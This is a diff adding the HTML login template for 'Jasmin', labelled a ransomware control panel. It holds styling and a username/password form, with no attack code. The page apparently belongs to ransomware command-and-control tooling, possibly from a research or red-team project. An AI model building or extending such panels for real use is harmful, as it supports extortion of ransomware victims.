@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>Jasmin — Login</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:'Segoe UI',system-ui,sans-serif;background:#060a13;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.wrap{width:100%;max-width:380px;padding:20px}
+form{background:#0d1321;border:1px solid #1a2340;border-radius:16px;padding:40px 32px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.5)}
+.logo{font-size:2.4rem;color:#f43f5e;margin-bottom:8px}
+h1{font-size:1.4rem;letter-spacing:4px;color:#e2e8f0;margin-bottom:4px}
+.sub{color:#4a5568;font-size:.78rem;margin-bottom:28px}
+.field{position:relative;margin-bottom:16px}
+.field i{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:#4a5568;font-size:.85rem}
+.field input{width:100%;padding:12px 14px 12px 40px;background:#060a13;border:1px solid #1a2340;border-radius:8px;color:#e2e8f0;font-size:.9rem;outline:none}
+.field input:focus{border-color:#4dc3fa}
+button{width:100%;padding:12px;background:linear-gradient(135deg,#f43f5e,#e11d48);border:none;border-radius:8px;color:#fff;font-size:.95rem;font-weight:600;cursor:pointer}
+button:hover{opacity:.9}
+.msg{margin-top:14px;font-size:.82rem;color:#f87171}
+</style>
+</head>
+<body>
+<div class="wrap">
+<form method="post">
+  <div class="logo"><i class="fas fa-skull-crossbones"></i></div>
+  <h1>JASMIN</h1>
+  <p class="sub">Ransomware Control Panel</p>
+  {% for m in get_flashed_messages() %}<p class="msg">{{ m }}</p>{% endfor %}
+  <div class="field"><i class="fas fa-user"></i><input name="username" placeholder="Username" required></div>
+  <div class="field"><i class="fas fa-lock"></i><input name="password" type="password" placeholder="Password" required></div>
+  <button type="submit">Authorize</button>
+</form>
+</div>
+</body></html>
